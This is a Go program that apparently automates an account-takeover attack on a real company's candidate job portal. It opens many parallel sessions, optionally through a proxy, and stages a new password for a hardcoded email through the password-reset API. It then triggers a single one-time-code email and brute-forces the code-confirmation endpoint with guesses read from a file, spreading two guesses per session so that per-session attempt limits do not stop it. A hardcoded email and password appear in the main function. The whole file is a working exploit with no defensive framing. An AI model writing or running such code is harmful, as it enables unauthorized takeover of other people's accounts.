package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Config struct {
	Email           string
	Domain          string
	Password        string
	ProxyURL        string
	NumFlows        int
	NumThreads      int
	SendOTPEarly    bool // true = send in first flow, false = send after all flows
}

type Session struct {
	Cookie    string
	CSRFToken string
}

var (
	sessions         []Session
	sessionsMutex    sync.Mutex
	sendOTPSent      int32
	sendOTPMutex     sync.Mutex
	requestCounter   int64
	requestCounterMutex sync.Mutex
)

func createHTTPClient(proxyURL string) (*http.Client, error) {
	jar, _ := cookiejar.New(nil)

	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 50,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 15 * time.Second,
		DisableKeepAlives:   false,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
		},
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	if proxyURL != "" {
		proxy, err := url.Parse(proxyURL)
		if err != nil {
			return nil, err
		}
		transport.Proxy = http.ProxyURL(proxy)
	}

	client := &http.Client{
		Jar:       jar,
		Timeout:   45 * time.Second,
		Transport: transport,
	}

	return client, nil
}

func readOTPsFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var otps []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		otp := strings.TrimSpace(scanner.Text())
		if otp != "" {
			// Pad with zeros if needed
			if len(otp) < 6 {
				otp = fmt.Sprintf("%06s", otp)
			} else if len(otp) > 6 {
				otp = otp[:6]
			}
			otps = append(otps, otp)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return otps, nil
}

func getNextRequestNumber() int64 {
	requestCounterMutex.Lock()
	defer requestCounterMutex.Unlock()
	requestCounter++
	return requestCounter
}

func doRequestWithRetry(client *http.Client, req *http.Request, maxRetries int) (*http.Response, error) {
	var resp *http.Response
	var err error

	for i := 0; i < maxRetries; i++ {
		var reqToSend *http.Request
		if req.GetBody != nil {
			body, _ := req.GetBody()
			reqToSend, _ = http.NewRequest(req.Method, req.URL.String(), body)
			reqToSend.Header = req.Header.Clone()
		} else {
			reqToSend = req
		}

		resp, err = client.Do(reqToSend)
		if err == nil {
			return resp, nil
		}

		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "TLS handshake") {
			if i < maxRetries-1 {
				backoff := time.Duration(i+1) * 500 * time.Millisecond
				time.Sleep(backoff)
				continue
			}
		}

		return nil, err
	}

	return nil, err
}

func executeFlow(config Config, flowNum int) {
	client, err := createHTTPClient(config.ProxyURL)
	if err != nil {
		fmt.Printf("flow %d - Error creating client: %v\n", flowNum, err)
		return
	}

	// Request 1: GET /candidate/login?
	req1, _ := http.NewRequest("GET", "https://jobs.amdocs.com/candidate/login?", nil)
	req1.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req1.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req1.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req1.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req1.Header.Set("Upgrade-Insecure-Requests", "1")
	req1.Header.Set("Sec-Fetch-Dest", "document")
	req1.Header.Set("Sec-Fetch-Mode", "navigate")
	req1.Header.Set("Sec-Fetch-Site", "none")
	req1.Header.Set("Sec-Fetch-User", "?1")
	req1.Header.Set("Priority", "u=0, i")
	req1.Header.Set("Te", "trailers")

	resp1, err := doRequestWithRetry(client, req1, 3)
	if err != nil {
		fmt.Printf("flow %d - Error in GET /candidate/login?: %v\n", flowNum, err)
		return
	}
	defer resp1.Body.Close()

	cookie := ""
	for _, c := range resp1.Cookies() {
		if c.Name == "_vs" {
			cookie = fmt.Sprintf("%s=%s", c.Name, c.Value)
			break
		}
	}

	if cookie == "" {
		fmt.Printf("flow %d - Error: Could not get cookie\n", flowNum)
		return
	}

	reqNum1 := getNextRequestNumber()
	fmt.Printf("%d. flow %d - GET /candidate/login? [%d]\n", reqNum1, flowNum, resp1.StatusCode)

	// Request 2: GET /api/career_signup/account_info
	emailEncoded := url.QueryEscape(config.Email)
	req2, _ := http.NewRequest("GET", fmt.Sprintf("https://jobs.amdocs.com/api/career_signup/account_info?domain=%s&email=%s", config.Domain, emailEncoded), nil)
	req2.Header.Set("Cookie", cookie)
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req2.Header.Set("Accept", "*/*")
	req2.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req2.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req2.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
	req2.Header.Set("Content-Type", "application/json")
	req2.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
	req2.Header.Set("Sec-Fetch-Dest", "empty")
	req2.Header.Set("Sec-Fetch-Mode", "cors")
	req2.Header.Set("Sec-Fetch-Site", "same-origin")
	req2.Header.Set("Priority", "u=0")
	req2.Header.Set("Cache-Control", "max-age=0")
	req2.Header.Set("Te", "trailers")

	resp2, err := doRequestWithRetry(client, req2, 3)
	if err != nil {
		fmt.Printf("flow %d - Error in GET /api/career_signup/account_info: %v\n", flowNum, err)
		return
	}
	defer resp2.Body.Close()

	csrfToken := resp2.Header.Get("X-Csrf-Token")
	if csrfToken == "" {
		fmt.Printf("flow %d - Error: Could not get CSRF token\n", flowNum)
		return
	}

	reqNum2 := getNextRequestNumber()
	fmt.Printf("%d. flow %d - GET /api/career_signup/account_info [%d]\n", reqNum2, flowNum, resp2.StatusCode)

	// Request 3: POST /api/career_signup/stage_password
	body3 := map[string]interface{}{
		"password":         config.Password,
		"domain":           config.Domain,
		"is_password_reset": true,
		"email":            config.Email,
	}
	jsonBody3, _ := json.Marshal(body3)

	req3, _ := http.NewRequest("POST", "https://jobs.amdocs.com/api/career_signup/stage_password", bytes.NewBuffer(jsonBody3))
	req3.Header.Set("Cookie", cookie)
	req3.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req3.Header.Set("Accept", "application/json, text/plain, */*")
	req3.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req3.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req3.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
	req3.Header.Set("Content-Type", "application/json")
	req3.Header.Set("X-Csrf-Token", csrfToken)
	req3.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
	req3.Header.Set("Origin", "https://jobs.amdocs.com")
	req3.Header.Set("Sec-Fetch-Dest", "empty")
	req3.Header.Set("Sec-Fetch-Mode", "cors")
	req3.Header.Set("Sec-Fetch-Site", "same-origin")
	req3.Header.Set("Priority", "u=0")
	req3.Header.Set("Te", "trailers")

	resp3, err := doRequestWithRetry(client, req3, 3)
	if err != nil {
		fmt.Printf("flow %d - Error in POST /api/career_signup/stage_password: %v\n", flowNum, err)
		return
	}
	defer resp3.Body.Close()

	reqNum3 := getNextRequestNumber()
	fmt.Printf("%d. flow %d - POST /api/career_signup/stage_password [%d]\n", reqNum3, flowNum, resp3.StatusCode)

	// Save session
	sessionsMutex.Lock()
	sessions = append(sessions, Session{
		Cookie:    cookie,
		CSRFToken: csrfToken,
	})
	sessionsMutex.Unlock()

	// Send send_otp_verification in first flow if SendOTPEarly is true
	if config.SendOTPEarly && flowNum == 1 {
		sendOTPVerification(config, cookie, csrfToken)
	}
}

func sendOTPVerification(config Config, cookie string, csrfToken string) {
	// Send send_otp_verification only once (with mutex for thread safety)
	sendOTPMutex.Lock()
	defer sendOTPMutex.Unlock()
	
	if !atomic.CompareAndSwapInt32(&sendOTPSent, 0, 1) {
		return // Already sent
	}

	reqNum := getNextRequestNumber()
	fmt.Printf("%d. Preparing to send POST /api/career_signup/send_otp_verification...\n", reqNum)

	client, err := createHTTPClient(config.ProxyURL)
	if err != nil {
		fmt.Printf("%d. Error creating client for send_otp_verification: %v\n", reqNum, err)
		atomic.StoreInt32(&sendOTPSent, 0) // Reset flag
		return
	}

	body := map[string]interface{}{
		"domain":        config.Domain,
		"next_url":      "/careerhub",
		"instance_type": "candidate",
		"language":      "en",
		"trigger":       "",
		"microsite":     "",
		"email":         config.Email,
	}
	jsonBody, _ := json.Marshal(body)

	req, err := http.NewRequest("POST", "https://jobs.amdocs.com/api/career_signup/send_otp_verification", bytes.NewBuffer(jsonBody))
	if err != nil {
		fmt.Printf("%d. Error creating request: %v\n", reqNum, err)
		atomic.StoreInt32(&sendOTPSent, 0)
		return
	}
	
	req.Header.Set("Cookie", cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Csrf-Token", csrfToken)
	req.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
	req.Header.Set("Origin", "https://jobs.amdocs.com")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Te", "trailers")

	fmt.Printf("%d. Sending POST /api/career_signup/send_otp_verification...\n", reqNum)
	resp, err := doRequestWithRetry(client, req, 5) // Increase retries
	if err != nil {
		fmt.Printf("%d. ERROR sending send_otp_verification: %v\n", reqNum, err)
		atomic.StoreInt32(&sendOTPSent, 0) // Reset flag on error
		return
	}
	defer resp.Body.Close()

	fmt.Printf("%d. POST /api/career_signup/send_otp_verification [%d] (sent once successfully)\n", reqNum, resp.StatusCode)
}

func bruteForceOTP(config Config, otpFile string) {
	fmt.Printf("\n=== Starting OTP Brute Force with %d sessions ===\n\n", len(sessions))

	if len(sessions) == 0 {
		fmt.Println("No sessions collected!")
		return
	}

	// Read OTPs from file
	otps, err := readOTPsFromFile(otpFile)
	if err != nil {
		fmt.Printf("Error reading OTP file: %v\n", err)
		return
	}

	if len(otps) == 0 {
		fmt.Println("No OTPs found in file!")
		return
	}

	fmt.Printf("Loaded %d OTPs from file\n\n", len(otps))

	var wg sync.WaitGroup
	var otpIndex int64 = 0

	// Each session will be used exactly 2 times
	for _, session := range sessions {
		for i := 0; i < 2; i++ {
			wg.Add(1)
			
			// Get next OTP from list
			currentIndex := atomic.AddInt64(&otpIndex, 1) - 1
			if int(currentIndex) >= len(otps) {
				// If we run out of OTPs, cycle back
				currentIndex = currentIndex % int64(len(otps))
			}
			otpStr := otps[currentIndex]
			reqNum := getNextRequestNumber()

			go func(s Session, otp string, reqNum int64) {
				defer wg.Done()

				client, err := createHTTPClient(config.ProxyURL)
				if err != nil {
					return
				}

				body := map[string]interface{}{
					"otp":    otp,
					"domain": config.Domain,
					"next":   "/careerhub",
					"email":  config.Email,
				}
				jsonBody, _ := json.Marshal(body)

				req, _ := http.NewRequest("POST", "https://jobs.amdocs.com/api/career_signup/confirm_otp", bytes.NewBuffer(jsonBody))
				req.Header.Set("Cookie", s.Cookie)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
				req.Header.Set("Accept", "application/json, text/plain, */*")
				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Referer", "https://jobs.amdocs.com/candidate/login?")
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("X-Csrf-Token", s.CSRFToken)
				req.Header.Set("X-Browser-Request-Time", fmt.Sprintf("%.3f", float64(time.Now().UnixNano())/1e9))
				req.Header.Set("Origin", "https://jobs.amdocs.com")
				req.Header.Set("Sec-Fetch-Dest", "empty")
				req.Header.Set("Sec-Fetch-Mode", "cors")
				req.Header.Set("Sec-Fetch-Site", "same-origin")
				req.Header.Set("Priority", "u=0")
				req.Header.Set("Te", "trailers")

				resp, err := doRequestWithRetry(client, req, 3)
				if err != nil {
					fmt.Printf("%d. POST /api/career_signup/confirm_otp [ERROR] OTP: %s\n", reqNum, otp)
					return
				}
				defer resp.Body.Close()

				fmt.Printf("%d. POST /api/career_signup/confirm_otp [%d] OTP: %s\n", reqNum, resp.StatusCode, otp)
			}(session, otpStr, reqNum)
		}
	}

	wg.Wait()
	fmt.Println("\n=== Brute Force Completed ===")
}

func main() {
	config := Config{
		Email:    "dashun.cavin@dropmeon.com",
		Domain:   "amdocs.com",
		Password: "NEWpOSS123@2",
		ProxyURL: "",
	}

	// Ask for number of flow repetitions
	fmt.Print("How many repeated flows do you need? (e.g., 5): ")
	reader := bufio.NewReader(os.Stdin)
	flowsInput, _ := reader.ReadString('\n')
	flowsInput = strings.TrimSpace(flowsInput)
	numFlows, err := strconv.Atoi(flowsInput)
	if err != nil || numFlows <= 0 {
		fmt.Println("Invalid input, using default: 5")
		numFlows = 5
	}
	config.NumFlows = numFlows

	// Ask for proxy
	fmt.Print("Enter proxy URL (optional, press Enter to skip): ")
	proxyInput, _ := reader.ReadString('\n')
	proxyInput = strings.TrimSpace(proxyInput)
	if proxyInput != "" {
		config.ProxyURL = proxyInput
		fmt.Printf("Using proxy: %s\n", config.ProxyURL)
	} else {
		fmt.Println("No proxy configured, using direct connection")
	}

	// Ask for number of threads
	fmt.Print("Enter number of threads: ")
	threadsInput, _ := reader.ReadString('\n')
	threadsInput = strings.TrimSpace(threadsInput)
	numThreads, err := strconv.Atoi(threadsInput)
	if err != nil || numThreads <= 0 {
		fmt.Println("Invalid input, using default: 10")
		numThreads = 10
	}
	config.NumThreads = numThreads

	// Ask when to send send_otp_verification
	fmt.Print("Send send_otp_verification in first flow or after all flows? (first/last, default: first): ")
	otpTimingInput, _ := reader.ReadString('\n')
	otpTimingInput = strings.TrimSpace(strings.ToLower(otpTimingInput))
	if otpTimingInput == "last" {
		config.SendOTPEarly = false
		fmt.Println("Will send send_otp_verification after all flows complete")
	} else {
		config.SendOTPEarly = true
		fmt.Println("Will send send_otp_verification in first flow")
	}

	fmt.Printf("\n=== Starting %d flows with %d threads ===\n\n", config.NumFlows, config.NumThreads)

	sessions = make([]Session, 0, config.NumFlows)
	var wg sync.WaitGroup

	// Execute flows with controlled concurrency
	semaphore := make(chan struct{}, config.NumThreads)

	for i := 1; i <= config.NumFlows; i++ {
		wg.Add(1)
		semaphore <- struct{}{} // Acquire semaphore

		go func(flowNum int) {
			defer wg.Done()
			defer func() { <-semaphore }() // Release semaphore
			executeFlow(config, flowNum)
		}(i)
	}

	wg.Wait()

	fmt.Printf("\n=== Completed %d flows, collected %d sessions ===\n", config.NumFlows, len(sessions))

	// Send send_otp_verification once (only if not sent in first flow)
	if !config.SendOTPEarly {
		fmt.Println("\nSending send_otp_verification (once)...")
		if len(sessions) > 0 {
			firstSession := sessions[0]
			sendOTPVerification(config, firstSession.Cookie, firstSession.CSRFToken)
		} else {
			fmt.Println("ERROR: No sessions available for send_otp_verification!")
		}
	}

	// Ask for OTP file
	fmt.Print("\nEnter OTP file path (e.g., otps.txt): ")
	otpFileInput, _ := reader.ReadString('\n')
	otpFileInput = strings.TrimSpace(otpFileInput)
	if otpFileInput == "" {
		fmt.Println("No OTP file provided, using default: otps.txt")
		otpFileInput = "otps.txt"
	}

	// Start brute force
	bruteForceOTP(config, otpFileInput)

	fmt.Println("\n=== All done! ===")
}
